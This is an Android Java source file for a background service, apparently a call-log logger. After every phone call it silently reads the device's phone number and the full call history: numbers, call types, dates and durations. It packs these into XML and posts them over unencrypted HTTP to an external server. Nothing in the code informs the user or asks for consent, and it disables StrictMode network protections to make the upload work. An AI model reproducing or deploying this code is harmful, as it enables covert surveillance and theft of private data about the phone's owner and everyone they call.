package com.example.mobilelog;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.Reader;
import java.io.UnsupportedEncodingException;
import java.util.Date;

import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.StrictMode;
import android.provider.CallLog;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;


@SuppressLint("NewApi")
public class MyService extends Service {

	  @Override
	  public int onStartCommand(Intent intent, int flags, int startId) {

		  TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
	      tm.listen(mPhoneListener, PhoneStateListener.LISTEN_CALL_STATE);
		  
	    return Service.START_STICKY;
	  }

	  @Override
	  public IBinder onBind(Intent intent) {
	  //TODO for communication return IBinder implementation
	    return null;
	  }
	  
	  
		 private void getCallDetails() {

			 
				if (android.os.Build.VERSION.SDK_INT > 9) {
					StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
					StrictMode.setThreadPolicy(policy);
				}

			 
			 
			 	Context context = MyService.this;

			 	StringBuffer sb = new StringBuffer();

			 	sb.append("<document>");
		        
		        TelephonyManager tMgr =(TelephonyManager)MyService.this.getSystemService(Context.TELEPHONY_SERVICE);
		        String mPhoneNumber = tMgr.getLine1Number();
		        //Log.i("aaa-log", mPhoneNumber);
		        
		        sb.append("<mynumber>");
		        sb.append(mPhoneNumber);
		        sb.append("</mynumber>");

		        
		        sb.append("<calls>");
		        
		        Uri contacts = CallLog.Calls.CONTENT_URI;
		        
		        
		        //Log.i("aaa-ok", "-start cursor-");
		        

		        
		        
		        
		        Cursor managedCursor = context.getContentResolver().query(contacts, null, null, null, null);
		        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
		        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
		        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
		        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);

		        //Toast.makeText(MainActivity.this, sb, Toast.LENGTH_SHORT).show();
		        
		        while (managedCursor.moveToNext()) {

		        	//HashMap rowDataCall = new HashMap<String, String>();
		        	

		            String phNumber = managedCursor.getString(number);
		            String callType = managedCursor.getString(type);
		            String callDate = managedCursor.getString(date);
		            String callDayTime = new Date(Long.valueOf(callDate)).toString();
		            // long timestamp = convertDateToTimestamp(callDayTime);
		            String callDuration = managedCursor.getString(duration);
		            String dir = null;
		            int dircode = Integer.parseInt(callType);
		            switch (dircode) {
		            case CallLog.Calls.OUTGOING_TYPE:
		                dir = "OUTGOING";
		                break;

		            case CallLog.Calls.INCOMING_TYPE:
		                dir = "INCOMING";
		                break;

		            case CallLog.Calls.MISSED_TYPE:
		                dir = "MISSED";
		                break;
		            }

		            //sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- " + dir + " \nCall Date:--- " + callDayTime + " \nCall duration in sec :--- " + callDuration);
		            //sb.append("\n----------------------------------");
		            
		            sb.append("<call>");
		            sb.append("<number>"+phNumber+"</number>");
		            sb.append("<type>"+callType+"</type>");
		            sb.append("<date>"+callDayTime+"</date>");
		            sb.append("<duration>"+callDuration+"</duration>");
		            sb.append("</call>");


		        }
		        managedCursor.close();
		        
		        
		        
		        //Log.i("aaa-ok", sb.toString());
		        
		        sb.append("</calls></document>");
		        
		        String urlToSendRequest = "http://www.publishingresources.org/droid/";
		        DefaultHttpClient httpClient = new DefaultHttpClient();
		        HttpPost httpPost = new HttpPost(urlToSendRequest);
		        httpPost.addHeader("Accept", "text/xml");
		        httpPost.addHeader("Content-Type", "application/xml");
		        
		        //Toast.makeText(MyService.this, "0001", Toast.LENGTH_SHORT).show();
		        
		        try {			
		        	StringEntity entity = new StringEntity(sb.toString(), "UTF-8");
			        entity.setContentType("application/xml");
			        httpPost.setEntity(entity);
			        HttpResponse response = httpClient.execute(httpPost);
			        
			    
			        //Reader r = new InputStreamReader(response.getEntity().getContent());
			        //Toast.makeText(MyService.this, r.toString(), Toast.LENGTH_SHORT).show();

		        } catch (UnsupportedEncodingException e1) {
					e1.printStackTrace();					
		        } catch (ClientProtocolException e) {		        	
					e.printStackTrace();
				} catch (IOException e) {
					e.printStackTrace();
				}

		        
		        
		        
		 }

		
		private PhoneStateListener mPhoneListener = new PhoneStateListener() {
			public void onCallStateChanged(int state, String incomingNumber) {
				try {
					switch (state) {
						case TelephonyManager.CALL_STATE_RINGING:
							//Toast.makeText(MyService.this, "CALL_STATE_RINGING_blah", Toast.LENGTH_SHORT).show();
							break;
						case TelephonyManager.CALL_STATE_OFFHOOK:
							//Toast.makeText(MyService.this, "CALL_STATE_OFFHOOK_blah", Toast.LENGTH_SHORT).show();
							break;
						case TelephonyManager.CALL_STATE_IDLE:
							//Toast.makeText(MyService.this, "CALL_STATE_IDLE_blah", Toast.LENGTH_SHORT).show();
							getCallDetails();
							break;
						default:
							//Toast.makeText(MyService.this, "default", Toast.LENGTH_SHORT).show();
							//Log.i("Default", "Unknown phone state=" + state);
					}
				} catch (Exception e) {
					//Log.i("Exception", "PhoneStateListener() e = " + e);
				}
			}
		};

	  
	  
}
